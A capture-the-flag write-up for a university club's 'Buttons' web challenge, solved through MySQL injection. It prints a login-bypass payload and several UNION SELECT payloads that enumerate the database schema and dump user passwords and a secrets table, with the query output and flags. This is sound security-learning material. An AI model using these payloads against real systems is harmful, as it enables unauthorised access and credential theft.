# Buttons
>  http://buttons.ctf-league.osusec.org/
> this was a mysql injection based challenge

## Solution

> the order that we got the flags was flag 1, 3 and then 2, but the write up will be in the order of flag 1, 2 and 3

### Flag 1
Testing out just a simple sql injection on the login page, I tried just 'admin' 'admin' which did not work,
I then tried 
```sql
admin'#
```

with no password which gave me the flag

```shell
osu{qu0t3_m3_0n_th4t}
```

### Flag 2
using the same score leaderboard that we used to find the flag 3 we were trying to find the second flag that we missed

guessing it had something to do with the users table and trying to get their username or password, I tried a few different payloads,

just guessing at pulling columns from the data base, trying to find information on if there is any special user or password that we can use to login with, I tried the following payload

```sql
' UniOn Select 1,gRoUp_cOncaT(0x7c,id,password,0x7C) fRoM users -- 
```

this gave us the final flag we were missing:
    
```shell
osu{4nd5up3rs3cr3tp455w0rd}
```

this was de

### Flag 3

up next was trying to find out how to get more info on the sql server,

I followed a mysql flow site to help me with this: https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection#flow

I first tried to detect the number of columns in the table by using the following payload by attempting different numbers of 'nulls' 

```sql
admin' UNION SELECT null,null,null,null --'
```
This brought me to a different page, where it listed a bunch of usernames, and scores in a leaderbaord.

as well as the ability to search for a users name

I then tried to get the database names by using the following payload

```sql
' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata -- 
```

this gave us the following database names: 

```shell
|mysql|,|information_schema|,|performance_schema|,|sys|,|ctfdb|
```

with all of these databases, we assumed we wanted the information_schema database, so we then tried to get the table names from the information_schema database by using the following injection

```sql
' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables -- 
```

this gave us the following table names: (there are a lot)

```shell
|scores|,|secrets|,|users|,|ADMINISTRABLE_ROLE_AUTHORIZATIONS|,|APPLICABLE_ROLES|,|CHARACTER_SETS|,|CHECK_CONSTRAINTS|,|COLLATIONS|,|COLLATION_CHARACTER_SET_APPLICABILITY|,|COLUMNS|,|COLUMNS_EXTENSIONS|,|COLUMN_PRIVILEGES|,|COLUMN_STATISTICS|,|ENABLED_ROLES|,|ENGINES|,|EVENTS|,|FILES|,|INNODB_BUFFER_PAGE|,|INNODB_BUFFER_PAGE_LRU|,|INNODB_BUFFER_POOL_STATS|,|INNODB_CACHED_INDEXES|,|INNODB_CMP|,|INNODB_CMPMEM|,|INNODB_CMPMEM_RESET|,|INNODB_CMP_PER_INDEX|,|INNODB_CMP_PER_INDEX_RESET|,|INNODB_CMP_RESET|,|INNODB_COLUMNS|,|INNODB_DATAFILES|,|INNODB_FIELDS|,|INNODB_FOREIGN|,|INNODB_FOREIGN_COLS|,|INNODB_FT_BEING_DELETED|,|INNODB_FT_CONFIG|,|INNODB_FT_DEFAULT_STOPWORD|,|INNODB_FT_DELETED|,|INNODB_FT_INDEX_CACHE|,|INNODB_FT_INDEX_TABLE|,|INNODB_INDEXES|,|INNODB_METRICS|,|INNODB_SESSION_TEMP_TABLESPACES|,|INNODB_TABLES|,|INNODB_TABLESPACES|,|INNODB_TABLESPACES_BRIEF|,|INNODB_TABLESTATS|,|INNODB_TEMP_TABLE_INFO|,|INNODB_TRX|,|INNODB_VIRTUAL|,|KEYWORDS|,|KEY_COLUMN_USAGE|,|OPTIMIZER_TRACE|,|PARAMETERS|,|PARTITIONS|,|PLUG
```

the one that sticks out is 'secrets' so we then tried to get the column names from the secrets table by using the following injection

```sql
' UniOn Select 1,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns WHERE table_name="secrets" -- 
```

This gave us the following column names:

```shell
|id|,|secret|
```

here secret sticks out like a sore thumb, and now we just need to get the data from secrets

trying out a few different commands to get teh information this is the one that worked:

```sql
' UniOn Select 1,gRoUp_cOncaT(0x7c,id,secret,0x7C) fRoM secrets -- 
```

this gave us our flag:

```shell
osu{sn34k1n_4r0und}
```

## Sumary

this challenge was not what I was used to, I am not awfully familiar with sql injection and this was a good challenge to get more familar with it. 

the first flag was easy to get, I remember from a previous ctf challenge I have done that the # symbol is used to comment out the rest of the query, and in combination with the ' to close the string, it was easy to get the first flag. as it skips the password check.

the third flag was noticably more difficult, having to gather information on the databse, the columns and the tables, adn then finally the data from the table was hard, but with the help of the link above to "guide" through the process it helped a lot with the process.

the second flag was definitely between the two other flags in terms of difficulty, just took some guessing and checking to get the flag, but it was not too difficult to get.

I do not understand the exact sql, but I do get the basics of why these injections work 

>** I do not own nor did I create the content for this challenge. This is a writeup for the challenge that I solved **
